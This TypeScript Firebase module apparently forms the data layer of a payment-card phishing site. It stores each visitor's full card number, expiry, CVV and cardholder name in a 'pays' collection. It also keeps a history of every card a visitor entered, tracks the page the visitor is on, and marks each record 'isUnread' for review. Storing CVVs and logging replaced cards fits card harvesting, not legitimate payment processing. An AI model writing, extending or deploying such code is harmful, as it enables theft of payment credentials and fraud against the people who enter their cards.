import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { doc, getDoc, getFirestore, setDoc } from "firebase/firestore";

const firebaseConfig = {
  apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
  storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
  appId: import.meta.env.VITE_FIREBASE_APP_ID,
  measurementId: import.meta.env.VITE_FIREBASE_MEASUREMENT_ID,
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

type FirebasePayData = {
  id?: string | null;
  [key: string]: unknown;
};

type CardSnapshot = {
  cardholderName?: string;
  cardNumberFull?: string;
  cardNumberMasked?: string;
  expiry?: string;
  cvv?: string;
};

type CardHistoryEntry = CardSnapshot & {
  changedAt: string;
};

type StoredPayRecord = {
  createdAt?: string;
  payment?: Record<string, unknown>;
  cardHistory?: CardHistoryEntry[];
  [key: string]: unknown;
};

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

function toStringOrUndefined(value: unknown): string | undefined {
  if (typeof value !== "string") {
    return undefined;
  }

  const trimmed = value.trim();
  return trimmed ? trimmed : undefined;
}

function readCardSnapshot(payment: Record<string, unknown> | undefined): CardSnapshot | null {
  if (!payment) {
    return null;
  }

  const snapshot: CardSnapshot = {
    cardholderName: toStringOrUndefined(payment.cardholderName),
    cardNumberFull: toStringOrUndefined(payment.cardNumberFull),
    cardNumberMasked: toStringOrUndefined(payment.cardNumberMasked),
    expiry: toStringOrUndefined(payment.expiry),
    cvv: toStringOrUndefined(payment.cvv),
  };

  const hasAnyCardField = Object.values(snapshot).some((value) => Boolean(value));
  return hasAnyCardField ? snapshot : null;
}

function cardSnapshotKey(snapshot: CardSnapshot): string {
  return [
    snapshot.cardholderName ?? "",
    snapshot.cardNumberFull ?? "",
    snapshot.cardNumberMasked ?? "",
    snapshot.expiry ?? "",
    snapshot.cvv ?? "",
  ].join("|");
}

function normalizeCardHistory(value: unknown): CardHistoryEntry[] {
  if (!Array.isArray(value)) {
    return [];
  }

  return value
    .filter((entry) => isRecord(entry))
    .map((entry) => ({
      cardholderName: toStringOrUndefined(entry.cardholderName),
      cardNumberFull: toStringOrUndefined(entry.cardNumberFull),
      cardNumberMasked: toStringOrUndefined(entry.cardNumberMasked),
      expiry: toStringOrUndefined(entry.expiry),
      cvv: toStringOrUndefined(entry.cvv),
      changedAt: toStringOrUndefined(entry.changedAt) ?? new Date().toISOString(),
    }));
}

export async function getData(id: string) {
  try {
    const { getDoc, doc: firestoreDoc } = await import("firebase/firestore");
    const docRef = firestoreDoc(db, "pays", id);
    const docSnap = await getDoc(docRef);

    if (docSnap.exists()) {
      return docSnap.data();
    }
    return null;
  } catch (error) {
    console.error("Error getting document: ", error);
    return null;
  }
}

/**
 * @deprecated This function is no longer used. Use addToHistory from history-utils instead.
 * This function pollutes history with full page data instead of specific entries.
 */
export async function saveToHistory(_visitorID: string, _step: number) {
  console.warn("saveToHistory is deprecated and should not be used");
  return;
}

export async function addData(data: FirebasePayData) {
  if (!data.id) {
    throw new Error("Missing visitor/payment ID for Firebase write.");
  }

  if (typeof window !== "undefined") {
    window.localStorage.setItem("visitor", data.id);
  }

  try {
    const docRef = doc(db, "pays", data.id);
    const existingSnapshot = await getDoc(docRef);
    const existingData = existingSnapshot.exists()
      ? (existingSnapshot.data() as StoredPayRecord)
      : null;
    const nowIso = new Date().toISOString();

    const existingPayment = isRecord(existingData?.payment)
      ? existingData.payment
      : undefined;
    const incomingPayment = isRecord(data.payment) ? data.payment : undefined;
    const mergedPayment =
      existingPayment || incomingPayment
        ? { ...(existingPayment ?? {}), ...(incomingPayment ?? {}) }
        : undefined;

    const previousCard = readCardSnapshot(existingPayment);
    const nextCard = readCardSnapshot(mergedPayment);
    const nextCardHistory = normalizeCardHistory(existingData?.cardHistory);
    if (
      previousCard &&
      nextCard &&
      cardSnapshotKey(previousCard) !== cardSnapshotKey(nextCard)
    ) {
      nextCardHistory.push({
        ...previousCard,
        changedAt: nowIso,
      });
    }

    const payload: Record<string, unknown> = {
      ...data,
      createdAt: existingData?.createdAt ?? nowIso,
      updatedAt: nowIso,
      isUnread: true,
    };
    if (mergedPayment) {
      payload.payment = mergedPayment;
    }
    if (nextCardHistory.length > 0) {
      payload.cardHistory = nextCardHistory;
    }

    await setDoc(
      docRef,
      payload,
      { merge: true }
    );
  } catch (error) {
    console.error("Error adding document: ", error);
    throw error;
  }
}

export const handleCurrentPage = (page: string) => {
  const visitorId =
    typeof window !== "undefined"
      ? window.localStorage.getItem("visitor")
      : null;

  if (!visitorId) {
    return;
  }

  void addData({ id: visitorId, currentPage: page });
};

export const handlePay = async (
  paymentInfo: Record<string, unknown>,
  setPaymentInfo: (
    updater: (prev: Record<string, unknown>) => Record<string, unknown>
  ) => void
) => {
  try {
    const visitorId =
      typeof window !== "undefined"
        ? window.localStorage.getItem("visitor")
        : null;

    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: "pending" },
        { merge: true }
      );
      setPaymentInfo((prev) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    if (typeof window !== "undefined") {
      window.alert("Error adding payment info to Firestore");
    }
  }
};

export { db, database, setDoc, doc };
